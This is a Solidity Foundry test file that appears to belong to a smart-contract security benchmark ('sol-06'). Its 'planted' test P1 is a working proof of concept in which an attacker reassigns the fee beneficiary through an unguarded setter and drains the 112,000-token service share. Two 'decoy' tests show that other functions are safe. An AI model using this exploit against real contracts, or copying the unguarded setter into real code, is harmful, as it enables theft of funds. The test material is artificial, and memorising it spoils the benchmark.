// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {TollWeaver} from "../src/vulnerable/TollWeaver.sol";
import {LaneCoinMock} from "./mocks/LaneCoinMock.sol";

/// @dev sol-06 proofs. Vulnerable.t.sol and Fixed.t.sol differ only in the TollWeaver import
///      path and the test contract name (see PROOF.md); the test bodies are byte-identical.
contract VulnerableTest is Test {
    uint16 internal constant ROUTE_BPS = 30; // 0.30 % route charge
    uint16 internal constant SERVICE_BPS = 7_000; // 70 % of every charge to the service beneficiary
    uint256 internal constant LIMIT = 1_000_000e6;

    uint256 internal constant NOTIONAL = 50_000_000e6;
    uint256 internal constant ROUTE_CHARGE = 150_000e6; // 50,000,000 * 0.30 %
    uint256 internal constant SETTLEMENT_CHARGE = 10_000e6;
    uint256 internal constant SERVICE_ACCRUED = 112_000e6; // 70 % of 160,000
    uint256 internal constant CONTINUITY_ACCRUED = 48_000e6; // 30 % of 160,000

    address internal steward = makeAddr("steward");
    address internal courier = makeAddr("courier");
    address internal beneficiary = makeAddr("serviceBeneficiary");
    address internal fund = makeAddr("continuityFund");
    address internal payer = makeAddr("payer");
    address internal nominee = makeAddr("nominee");
    address internal attacker = makeAddr("attacker");

    TollWeaver internal weaver;
    LaneCoinMock internal coin;

    function setUp() public {
        coin = new LaneCoinMock();
        weaver = new TollWeaver(steward, courier, beneficiary, fund, ROUTE_BPS, SERVICE_BPS);

        vm.prank(steward);
        weaver.setAssetPolicy(address(coin), true, LIMIT);

        // A lane user pays the route charge on 50,000,000 LANE of notional: 150,000 LANE.
        coin.mint(payer, ROUTE_CHARGE);
        vm.startPrank(payer);
        coin.approve(address(weaver), ROUTE_CHARGE);
        uint256 charged = weaver.contributeRouteCharge(address(coin), NOTIONAL, bytes32("route-1"));
        vm.stopPrank();
        assertEq(charged, ROUTE_CHARGE, "route charge");

        // The courier books a 10,000 LANE settlement charge.
        coin.mint(courier, SETTLEMENT_CHARGE);
        vm.startPrank(courier);
        coin.approve(address(weaver), SETTLEMENT_CHARGE);
        weaver.submitSettlementCharge(address(coin), SETTLEMENT_CHARGE, bytes32("settle-1"));
        vm.stopPrank();

        assertEq(coin.balanceOf(address(weaver)), ROUTE_CHARGE + SETTLEMENT_CHARGE, "weaver holds 160,000");
        assertEq(weaver.outstandingProceeds(address(coin)), SERVICE_ACCRUED + CONTINUITY_ACCRUED, "outstanding");
    }

    /// @notice P1: an arbitrary account repoints the service beneficiary at itself and then
    ///         triggers the permissionless release, walking away with the 112,000 LANE service share.
    function test_planted_P1() public {
        assertEq(weaver.serviceBeneficiary(), beneficiary, "configured beneficiary");
        assertEq(coin.balanceOf(attacker), 0, "attacker starts with nothing");

        vm.startPrank(attacker);
        (bool reassigned,) =
            address(weaver).call(abi.encodeWithSignature("setServiceBeneficiary(address)", attacker));
        weaver.releaseProceeds(address(coin));
        vm.stopPrank();

        emit log_named_string("setServiceBeneficiary called by attacker", reassigned ? "accepted" : "rejected");
        emit log_named_decimal_uint("attacker LANE", coin.balanceOf(attacker), 6);
        emit log_named_decimal_uint("beneficiary LANE", coin.balanceOf(beneficiary), 6);
        emit log_named_decimal_uint("continuity fund LANE", coin.balanceOf(fund), 6);

        assertEq(coin.balanceOf(attacker), SERVICE_ACCRUED, "attacker received the 112,000 LANE service share");
        assertEq(coin.balanceOf(beneficiary), 0, "configured beneficiary received nothing");
        assertEq(coin.balanceOf(fund), CONTINUITY_ACCRUED, "continuity fund still paid 48,000 LANE");
        assertEq(coin.balanceOf(address(weaver)), 0, "weaver holds no accrued proceeds");
        assertEq(weaver.serviceBeneficiary(), attacker, "attacker stays the beneficiary for future charges");
    }

    /// @notice D1: acceptStewardship has no modifier but only the nominated account can complete it.
    function test_decoy_D1() public {
        // No nomination yet: pendingSteward is address(0) and no caller can match it.
        vm.prank(attacker);
        vm.expectRevert(TollWeaver.NotPendingSteward.selector);
        weaver.acceptStewardship();

        // Nomination itself is restricted.
        vm.prank(attacker);
        vm.expectRevert(TollWeaver.NotSteward.selector);
        weaver.nominateSteward(attacker);

        vm.prank(steward);
        weaver.nominateSteward(nominee);
        assertEq(weaver.steward(), steward, "nomination alone does not transfer");
        assertEq(weaver.pendingSteward(), nominee, "nominee recorded");

        // Neither an outsider, the courier nor the current steward can accept for the nominee.
        address[3] memory others = [attacker, courier, steward];
        for (uint256 i = 0; i < others.length; i++) {
            vm.prank(others[i]);
            vm.expectRevert(TollWeaver.NotPendingSteward.selector);
            weaver.acceptStewardship();
        }
        assertEq(weaver.steward(), steward, "steward unchanged after rejected attempts");

        vm.prank(nominee);
        weaver.acceptStewardship();
        assertEq(weaver.steward(), nominee, "nominee is steward");
        assertEq(weaver.pendingSteward(), address(0), "pending slot cleared");

        // The acceptance cannot be replayed and the previous steward has lost its rights.
        vm.prank(nominee);
        vm.expectRevert(TollWeaver.NotPendingSteward.selector);
        weaver.acceptStewardship();

        vm.prank(steward);
        vm.expectRevert(TollWeaver.NotSteward.selector);
        weaver.setRouteRate(50);

        vm.prank(nominee);
        weaver.setRouteRate(50);
        assertEq(weaver.routeBps(), 50, "new steward configures");
    }

    /// @notice D2: laneSnapshot only reads. It returns values that are already public, performs no
    ///         storage write, and proceeds still go to the configured recipients afterwards.
    function test_decoy_D2() public {
        vm.record();
        vm.prank(attacker);
        TollWeaver.LaneSnapshot memory state = weaver.laneSnapshot(address(coin));
        (, bytes32[] memory writes) = vm.accesses(address(weaver));
        assertEq(writes.length, 0, "snapshot wrote no storage slot");

        (bool ok,) = address(weaver).staticcall(abi.encodeCall(TollWeaver.laneSnapshot, (address(coin))));
        assertTrue(ok, "snapshot succeeds under STATICCALL");

        assertEq(state.steward, weaver.steward(), "steward");
        assertEq(state.pendingSteward, weaver.pendingSteward(), "pendingSteward");
        assertEq(state.courier, weaver.courier(), "courier");
        assertEq(state.serviceBeneficiary, weaver.serviceBeneficiary(), "serviceBeneficiary");
        assertEq(state.continuityFund, weaver.continuityFund(), "continuityFund");
        assertEq(state.routeBps, weaver.routeBps(), "routeBps");
        assertEq(state.serviceBps, weaver.serviceBps(), "serviceBps");
        assertEq(state.intakePaused, weaver.intakePaused(), "intakePaused");
        assertTrue(state.assetEnabled, "assetEnabled");
        assertEq(state.outstandingLimit, LIMIT, "outstandingLimit");
        assertEq(state.serviceAccrued, SERVICE_ACCRUED, "serviceAccrued 112,000");
        assertEq(state.continuityAccrued, CONTINUITY_ACCRUED, "continuityAccrued 48,000");
        assertEq(
            state.serviceAccrued + state.continuityAccrued,
            weaver.outstandingProceeds(address(coin)),
            "snapshot matches the public total"
        );

        // Knowing the figures gives the reader nothing: a release still pays the configured recipients.
        vm.prank(attacker);
        weaver.releaseProceeds(address(coin));
        assertEq(coin.balanceOf(beneficiary), SERVICE_ACCRUED, "beneficiary paid 112,000 LANE");
        assertEq(coin.balanceOf(fund), CONTINUITY_ACCRUED, "fund paid 48,000 LANE");
        assertEq(coin.balanceOf(attacker), 0, "reader gained nothing");
    }
}
